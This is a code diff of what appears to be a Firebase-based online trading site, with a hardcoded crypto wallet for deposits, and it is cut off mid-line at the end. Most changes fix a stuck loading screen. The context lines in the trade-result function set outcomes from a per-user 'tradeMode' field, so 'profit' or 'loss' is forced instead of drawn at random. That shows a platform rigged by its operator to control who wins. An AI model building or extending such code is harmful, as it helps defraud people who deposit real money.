@@ -184,14 +184,18 @@
 
         function copyWallet() { navigator.clipboard.writeText('TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM'); document.getElementById('copyBtn').innerText="COPIED!"; setTimeout(()=>document.getElementById('copyBtn').innerText="COPY",2000); }
 
-        // Fix: Safety timeout for loader
+        // --- STUCK LOADER FIX ---
+        // Forcefully hide loader after 3 seconds if authentication hasn't resolved
         setTimeout(() => {
             const loader = document.getElementById('loadingScreen');
-            if (loader.style.display !== 'none' && !auth.currentUser) {
+            if (loader && loader.style.display !== 'none') {
+                console.log("Loader stuck, forcing hide...");
                 loader.style.display = 'none';
-                document.getElementById('authSection').style.display = 'flex';
+                if (!auth.currentUser) {
+                    document.getElementById('authSection').style.display = 'flex';
+                }
             }
-        }, 5000);
+        }, 3000);
 
         auth.onAuthStateChanged(user => {
             const loader = document.getElementById('loadingScreen');
@@ -200,23 +204,23 @@
                     userData = doc.data();
                     if(userData) {
                         document.getElementById('balanceDisp').innerText = "$" + (userData.balance || 0).toFixed(2);
-                        const initial = user.email[0].toUpperCase();
+                        const initial = (user.email || "?")[0].toUpperCase();
                         
                         document.getElementById('userInitial').innerText = initial;
                         document.getElementById('modalInitial').innerText = initial;
                         document.getElementById('modalEmail').innerText = user.email;
-                        document.getElementById('depEmail').value = user.email; // Auto-fill email in deposit
+                        document.getElementById('depEmail').value = user.email;
 
                         document.getElementById('authSection').style.display = 'none';
                         document.getElementById('appTerminal').style.display = 'flex';
                         if(!chartLoaded) { loadChart('FX:EURUSD'); chartLoaded = true; }
-                        loader.style.display = 'none';
+                        if(loader) loader.style.display = 'none';
                     }
-                }, err => { loader.style.display = 'none'; });
+                }, err => { if(loader) loader.style.display = 'none'; });
             } else { 
                 document.getElementById('authSection').style.display = 'flex'; 
                 document.getElementById('appTerminal').style.display = 'none'; 
-                loader.style.display = 'none'; 
+                if(loader) loader.style.display = 'none'; 
             }
         });
 
@@ -290,5 +294,4 @@
         async function showRes(amt) {
             const m = userData.tradeMode || 'normal';
             let win = m === 'profit' ? true : (m === 'loss' ? false : Math.random() > 0.5);
-            const p = amt * 1.82, box = document.getElementById('resultBox');
-            if(win) { await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(p) }); box.innerHTML = `<h2 class="text-green-500 font-black">PRO
+            const p = amt * 1.82, box = document.getElementById('resultBox
